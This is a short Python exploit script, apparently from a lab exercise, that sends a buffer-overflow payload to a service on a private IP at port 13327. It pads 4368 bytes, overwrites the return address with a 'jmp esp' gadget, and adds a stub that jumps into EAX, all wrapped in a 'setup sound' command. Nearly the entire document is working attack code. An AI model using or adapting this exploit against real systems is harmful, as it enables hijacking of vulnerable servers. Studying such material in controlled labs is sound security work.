#!/usr/bin/python 

#08071e4e jump eax 
#08134596 jump esp 
# 83C00C 
# FFE0
import socket 

step = b"\x83\xc0\x0c\xff\xe0\x90\x90"

over = b"A"*4368+b"\x96\x45\x13\x08"+step

buffer = b"\x11(setup sound " + over + b"\x90\x00#"

s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

connect = s.connect(("192.168.164.129", 13327))
print(s.recv(1024))
s.send(buffer)
s.close()
print("[!] payload sent !")
